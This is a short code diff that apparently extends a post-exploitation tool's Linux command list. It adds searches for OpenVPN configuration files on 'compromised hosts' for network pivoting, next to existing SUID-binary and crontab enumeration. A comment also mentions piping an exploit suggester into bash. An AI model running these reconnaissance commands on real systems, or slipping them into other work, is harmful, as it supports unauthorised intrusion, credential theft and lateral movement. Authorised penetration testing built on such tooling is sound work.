@@ -64,6 +64,9 @@ LINUX_COMMANDS = [
     "find / -name 'docker-compose.yml' 2>/dev/null | head -5",
     "crontab -l 2>/dev/null",
     "find / -perm -4000 -type f 2>/dev/null | head -10",
+    # VPN pivot discovery: find OpenVPN configs staged on compromised hosts
+    "find / -name '*.ovpn' -o -name '*.conf' -path '*/openvpn/*' 2>/dev/null | head -10",
+    "ls -la /home/*/vpn-client/ /home/*/.openvpn/ /etc/openvpn/client/ 2>/dev/null",
 ]
 
 # URL for linux-exploit-suggester (pipe via bash without file transfer)
